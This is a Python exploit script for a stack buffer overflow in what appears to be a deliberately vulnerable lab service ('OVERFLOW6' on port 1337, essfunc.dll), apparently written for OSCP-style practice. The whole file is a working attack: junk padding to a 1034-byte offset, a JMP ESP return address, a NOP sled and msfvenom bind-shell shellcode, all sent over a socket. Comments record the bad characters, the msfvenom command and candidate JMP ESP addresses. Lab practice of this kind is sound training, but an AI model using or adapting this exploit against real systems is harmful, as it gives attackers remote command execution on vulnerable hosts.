import socket
import time


# Fuzzing shows crash at 1100 bytes input

host = "10.10.5.232"
port = 1337

offset = 1034
junk_data = bytearray(b"A" * offset)
return_address = bytearray(b"\xaf\x11\x50\x62")

nop_num_bytes = 100
nop_sled = bytearray(b"\x90" * nop_num_bytes)

shell_code = (
    b"\xd9\xd0\xb8\xe1\xab\x1c\x17\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
    b"\x53\x31\x43\x17\x83\xeb\xfc\x03\xa2\xb8\xfe\xe2\xd8\x57\x7c"
    b"\x0c\x20\xa8\xe1\x84\xc5\x99\x21\xf2\x8e\x8a\x91\x70\xc2\x26"
    b"\x59\xd4\xf6\xbd\x2f\xf1\xf9\x76\x85\x27\x34\x86\xb6\x14\x57"
    b"\x04\xc5\x48\xb7\x35\x06\x9d\xb6\x72\x7b\x6c\xea\x2b\xf7\xc3"
    b"\x1a\x5f\x4d\xd8\x91\x13\x43\x58\x46\xe3\x62\x49\xd9\x7f\x3d"
    b"\x49\xd8\xac\x35\xc0\xc2\xb1\x70\x9a\x79\x01\x0e\x1d\xab\x5b"
    b"\xef\xb2\x92\x53\x02\xca\xd3\x54\xfd\xb9\x2d\xa7\x80\xb9\xea"
    b"\xd5\x5e\x4f\xe8\x7e\x14\xf7\xd4\x7f\xf9\x6e\x9f\x8c\xb6\xe5"
    b"\xc7\x90\x49\x29\x7c\xac\xc2\xcc\x52\x24\x90\xea\x76\x6c\x42"
    b"\x92\x2f\xc8\x25\xab\x2f\xb3\x9a\x09\x24\x5e\xce\x23\x67\x37"
    b"\x23\x0e\x97\xc7\x2b\x19\xe4\xf5\xf4\xb1\x62\xb6\x7d\x1c\x75"
    b"\xb9\x57\xd8\xe9\x44\x58\x19\x20\x83\x0c\x49\x5a\x22\x2d\x02"
    b"\x9a\xcb\xf8\xbf\x92\x6a\x53\xa2\x5f\xcc\x03\x62\xcf\xa5\x49"
    b"\x6d\x30\xd5\x71\xa7\x59\x7e\x8c\x48\x74\x23\x19\xae\x1c\xcb"
    b"\x4f\x78\x88\x29\xb4\xb1\x2f\x51\x9e\xe9\xc7\x1a\xc8\x2e\xe8"
    b"\x9a\xde\x18\x7e\x11\x0d\x9d\x9f\x26\x18\xb5\xc8\xb1\xd6\x54"
    b"\xbb\x20\xe6\x7c\x2b\xc0\x75\x1b\xab\x8f\x65\xb4\xfc\xd8\x58"
    b"\xcd\x68\xf5\xc3\x67\x8e\x04\x95\x40\x0a\xd3\x66\x4e\x93\x96"
    b"\xd3\x74\x83\x6e\xdb\x30\xf7\x3e\x8a\xee\xa1\xf8\x64\x41\x1b"
    b"\x53\xda\x0b\xcb\x22\x10\x8c\x8d\x2a\x7d\x7a\x71\x9a\x28\x3b"
    b"\x8e\x13\xbd\xcb\xf7\x49\x5d\x33\x22\xca\x6d\x7e\x6e\x7b\xe6"
    b"\x27\xfb\x39\x6b\xd8\xd6\x7e\x92\x5b\xd2\xfe\x61\x43\x97\xfb"
    b"\x2e\xc3\x44\x76\x3e\xa6\x6a\x25\x3f\xe3"
)

buffer = junk_data + return_address + nop_sled + shell_code

def sendExploit(host, port, buffer):
    prefix = bytearray("OVERFLOW6 ".encode("ascii"))
    suffix = bytearray("".encode("ascii"))

    exploitInput = prefix + buffer + suffix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as csocket:
        csocket.connect((host, port))
        print("[+] Client connected.")

        print(f"[!] Data received from server: {csocket.recv(1024).decode('ascii')}")

        print("[+] Attempting to send exploit input...")
        csocket.send(exploitInput)


# Send data
sendExploit(host, port, buffer)


        
# Comments:

# EIP at crash: 35694234
# ESP at crash: 01A3FA30 -> 42366942


# EIP Pattern Offset: 1034
# ESP (0x01a3fa30) points at offset 1038 

# ESP points inside of the pattern
# We can use `JMP ESP` instruction
# to jump to our exploit input

# Bad chars: 0x00, 0x08, 0x2c, 0xad

# msfvenom -p windows/shell_bind_tcp -f c -a x86 --platform windows -b '\x00\x08\x2c\xad'

# `JMP ESP` Addresses without Bad chars
# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)